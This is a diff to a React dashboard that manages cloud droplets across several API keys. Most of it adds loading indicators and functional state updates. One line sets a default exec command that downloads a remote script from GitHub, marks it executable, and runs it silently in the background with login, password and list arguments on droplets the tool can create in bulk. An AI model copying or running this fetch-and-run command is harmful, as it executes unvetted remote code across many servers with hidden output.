@@ -24,7 +24,7 @@ ChartJS.register(
   Legend
 );
 
-const API = ''
+const API = 'http://localhost:9898'
 
 function App() {
   const $ta = useRef();
@@ -40,6 +40,14 @@ function App() {
     login: '',
     password: ''
   })
+  const [loadingState, setLoadingState] = useState({})
+
+  const setLoading = (apiKey, loading) => {
+    setLoadingState(prev => ({
+      ...prev,
+      [apiKey]: loading
+    }))
+  }
 
   const getAllData = async (keys) => {
     for (let apiKey of keys) {
@@ -81,6 +89,7 @@ function App() {
   }
 
   async function getData(apiKey) {
+    setLoading(apiKey, true)
     const droplets = await getApi('all', {
       headers: {
         'X-Token': apiKey,
@@ -91,10 +100,12 @@ function App() {
       ...prev,
       [apiKey]: droplets
     }))
+    setLoading(apiKey, false)
   }
 
   const getPerf = apiKey => async () => {
     const dropletsIds = state[apiKey].map(d => d.id)
+    setLoading(apiKey, true)
 
     const perf = await getApi(`perf`, {
       method: 'POST',
@@ -114,6 +125,7 @@ function App() {
         [apiKey]: perf
       }
     })
+    setLoading(apiKey, false)
   }
 
   const options = {
@@ -168,6 +180,8 @@ function App() {
   }
 
   const updatePerf = (id, index, apiKey) => async () => {
+    setLoading(apiKey, true)
+
     const perf = await getApi(`perf/${id}`, {
       method: 'POST',
       headers: {
@@ -185,19 +199,22 @@ function App() {
 
     np[index] = perf
 
-    setState({
-      ...state,
+    setState(prev => ({
+      ...prev,
       perf: {
         ...state.perf,
         [apiKey]: np
       }
-    })
+    }))
+    setLoading(apiKey, false)
   }
 
   const hardRestart = (id, name, apiKey) => async () => {
     if (!window.confirm('are you sure')) {
       return null
     }
+    setLoading(apiKey, true)
+
     await getApi(`restart/${id}/${name}`, {
       headers: {
         'X-Token': apiKey,
@@ -205,12 +222,16 @@ function App() {
     })
 
     await getData(apiKey)
+    setLoading(apiKey, false)
+
   }
 
   const deleteDroplet = (id, apiKey) => async () => {
     if (!window.confirm('are you sure')) {
       return null
     }
+    setLoading(apiKey, true)
+
     await getApi(`${id}`, {
       method: 'DELETE',
       headers: {
@@ -220,12 +241,16 @@ function App() {
     })
 
     await getData(apiKey)
+    setLoading(apiKey, false)
+
   }
 
   const deleteAllDroplet = apiKey => async () => {
     if (!window.confirm('are you sure')) {
       return null
     }
+    setLoading(apiKey, true)
+
     await getApi(`all`, {
       method: 'DELETE',
       headers: {
@@ -235,13 +260,15 @@ function App() {
     })
 
     await getData(apiKey)
-    setState({
-      ...state,
+    setState(prev => ({
+      ...prev,
       perf: []
-    })
+    }))
+    setLoading(apiKey, false)
   }
 
   const processApiKeys = () => {
+
     setApiKeys([])
     window.localStorage.removeItem('keys')
 
@@ -296,6 +323,8 @@ function App() {
 
     const name = prompt("enter name:")
 
+    setLoading(apiKey, true)
+
     await getApi(`create/${name}`, {
       method: 'POST',
       headers: {
@@ -309,6 +338,8 @@ function App() {
     })
 
     await getData(apiKey)
+    setLoading(apiKey, false)
+
   }
   const createDroplets = apiKey => async () => {
     if (!window.confirm('are you sure')) {
@@ -319,6 +350,8 @@ function App() {
     const prefix = prompt("prefix:")
 
     const names = Array(Number(amount)).fill(1).map((c, x) => `${prefix}${x + 1}`)
+    setLoading(apiKey, true)
+
 
     await getApi(`createAll`, {
       method: 'POST',
@@ -334,6 +367,8 @@ function App() {
     })
 
     await getData(apiKey)
+    setLoading(apiKey, false)
+
   }
 
   const fillDroplets = apiKey => async () => {
@@ -342,6 +377,9 @@ function App() {
     }
 
     const prefix = prompt("prefix:")
+
+    setLoading(apiKey, true)
+
 
     await getApi(`fill/${prefix}`, {
       method: 'POST',
@@ -356,6 +394,7 @@ function App() {
     })
 
     await getData(apiKey)
+    setLoading(apiKey, false)
   }
 
   return (
@@ -377,7 +416,7 @@ function App() {
           <div className="row">
             <div className="col">
               <label className="form-label">Exec command:</label>
-              <input type="text" ref={$exec} className="form-control mb-1" defaultValue={`#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &`} />
+              <input type="text" ref={$exec} className="form-control mb-1" defaultValue={`#!/bin/bash\\ncd /root\\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &`} />
             </div>
           </div>
           <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
@@ -385,6 +424,9 @@ function App() {
         {apiKeys.length > 0 && <>
           {apiKeys.map(apiKey => (
             <div className="card mb-2" key={apiKey}>
+              {loadingState[apiKey] && <Style.ProgressContainer>
+                <i class="bi bi-arrow-clockwise"></i>
+              </Style.ProgressContainer>}
               <div className="card-body">
                 <h5 className="card-title">{apiKey}</h5>
                   <div className="btn-group mb-3">
